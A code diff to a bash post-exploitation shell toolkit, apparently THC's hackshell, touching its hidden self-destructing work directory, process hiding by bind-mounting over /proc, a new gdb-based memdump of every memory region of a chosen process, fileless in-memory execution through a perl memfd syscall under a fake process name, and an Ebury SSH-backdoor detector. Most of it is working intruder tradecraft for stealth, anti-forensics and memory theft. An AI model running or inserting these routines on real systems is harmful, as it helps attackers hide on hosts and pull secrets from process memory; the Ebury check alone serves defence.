@@ -554,18 +554,24 @@ hide() {
     bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
 }
 
+_hs_xhome_mark_running() {
+    touch "${XHOME}/.run/.$$" 2>/dev/null
+}
+
 _hs_xhome_init() {
     [[ "$PATH" != *"$XHOME"* ]] && export PATH="${XHOME}:${XHOME}/bin:$PATH"
 }
 
 hs_mkxhome() {
     _hs_xhome_init
-    [ -d "${XHOME}" ] && return 255
-    mkdir -p "${XHOME:?}/bin" 2>/dev/null || return
-    echo -e ">>> Using ${CDY}XHOME=${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
-    echo -e ">>> Type ${CDC}xdestruct${CN} to erase ${CDY}${XHOME}${CN}"
-    echo -e ">>> Type ${CDC}xkeep${CN} to disable auto-destruct on exit."
-    echo -e ">>> Type ${CDC}xcd${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
+    [ ! -d "${XHOME}" ] && {
+        mkdir -p "${XHOME:?}/bin" "${XHOME}/.run" 2>/dev/null || return
+        echo -e ">>> Using ${CDY}XHOME=${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
+        echo -e ">>> Type ${CDC}xdestruct${CN} to erase ${CDY}${XHOME}${CN}"
+        echo -e ">>> Type ${CDC}xkeep${CN} to disable auto-destruct on exit."
+        echo -e ">>> Type ${CDC}xcd${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
+    }
+    _hs_xhome_mark_running
 }
 
 cdx() {
@@ -1319,6 +1325,17 @@ _warn_upx_exe() {
     echo -en "${str}"$'\033[0m'
 }
 
+memdump() {
+    local pid="${1:?}"
+    local x exe=$(readlink -f /proc/${pid}/exe 2>/dev/null)
+    exe="${exe##*/}"
+
+    cat "/proc/${pid}/maps" | cut -f1 -d" " | while read -r x; do
+        echo -e "${pid}\t ${exe}\t 0x${x%%-*}-0x${x##*-}"
+        gdb --batch --pid "$pid" "/proc/${pid}/exe" -ex "dump memory ${pid}_${exe}_${x%%-*}-${x##*-} 0x${x%%-*} 0x${x##*-}" &>/dev/null
+    done
+}
+
 # <pid> <string-pattern>
 # - on Read-only sections (.text, .rodata) of the process memory
 # - Fixed string pattern match only
@@ -1335,20 +1352,26 @@ _hs_gdb_proc_match() {
 
 _detect_ebury() {
     local st bin=$(readlink -f $(ldd -v $(command -v sshd 2>/dev/null) 2>/dev/null | grep -F 'keyutils' | awk '{print $3}' | head -n1) 2>/dev/null)
-    [ -z "$bin" ] && return 255
 
-    st=$(stat "${bin}")
+    [ -n "$bin" ] && [ -f "$bin" ] && {
+        st=$(stat "${bin}")
 
-    rv=$(ls -l "${bin}")
-    { [[ "$st" == *"-rwsr"* ]] || [[ "$st" == *"-rwSr"* ]] || [[ "$st" == *"-r-sr"* ]] || [[ "$st" == *"-r-Sr"* ]]; } && return 0 ## YES
+        rv=$(ls -l "${bin}")
+        { [[ "$st" == *"-rwsr"* ]] || [[ "$st" == *"-rwSr"* ]] || [[ "$st" == *"-r-sr"* ]] || [[ "$st" == *"-r-Sr"* ]]; } && return 0 ## YES
 
-    v=$(stat --format='%s' "${bin}")
-    [ -n "$v" ] && [ "$v" -gt 32000 ] && return 0 ## YES
+        v=$(stat --format='%s' "${bin}")
+        [ -n "$v" ] && [ "$v" -gt 32000 ] && return 0 ## YES
 
-    command -v nm >/dev/null && {
-        # Ebury binaries fail on nm -D
-        nm -D "${bin}" &>/dev/null || return 0 ## YES
+        command -v nm >/dev/null && {
+            # Ebury binaries fail on nm -D
+            nm -D "${bin}" &>/dev/null || return 0 ## YES
+        }
     }
+
+    rv=$(grep -E '@event-[a-zA-Z0-9]{10}'  /proc/net/unix)
+    [ -n "$rv" ] && { rv="Try lsof -U | grep event-"$'\n'"$rv"; return 0; } ## YES
+
+    return 255 ## NOT found.
 }
 
 # https://www.travismathison.com/posts/Decoding-Ebury-Malware-SSH-Commands/
@@ -1957,6 +1980,7 @@ _memexec() {
 
     _hs_dep perl || return
     shift
+    [ $PPID -eq 1 ] && exec perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"'"${name:-/usr/bin/python3}"'",@ARGV;exit 255' -- "$@"
     perl '-e$^F=255;for(319,279,385,4314,4354){($f=syscall$_,$",0)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"'"${name:-/usr/bin/python3}"'",@ARGV;exit 255' -- "$@"
     return $?
 }
@@ -2031,7 +2055,11 @@ hs_exit() {
         if [ -f "${XHOME}/.keep" ]; then
             HS_WARN "Keeping ${CDY}${XHOME}${CN}"
         else
-            _hs_destruct
+            # Delete my pid file. rmdir will success only if dir is empty
+            # and no other hackshell instances are running. Last to exit one
+            # will call _hs_destruct.
+            rm -f "${XHOME}/.run/.$$" 2>/dev/null
+            rmdir "${XHOME}/.run" 2>/dev/null && _hs_destruct
         fi
     }
     [ -z "$QUIET" ] && [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.org/tips${CN} 😘"
@@ -2291,12 +2319,15 @@ hs_init_shell() {
     [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"
 
     # Do not execute lootlight on every new shell
-    [ -z "$_HS_HUSH" ] && [ -f "${XHOME}" ] && _HS_HUSH=1
+    [ -z "$_HS_HUSH" ] && [ -d "${XHOME}" ] && _HS_HUSH=1
 
     [ -z "$_HS_PATH_ORIG" ] && _HS_PATH_ORIG="$PATH"
     [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
     # Might already exist.
-    [ -d "$XHOME" ] && _hs_xhome_init
+    [ -d "$XHOME" ] && {
+        _hs_xhome_init
+        _hs_xhome_mark_running
+    }
 
     # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \e[36m\u\e[m@\e[32m\h:\e[33;1m\w \e[0;31m\$\e[m '
     if [[ "$SHELL" == *"zsh" ]]; then
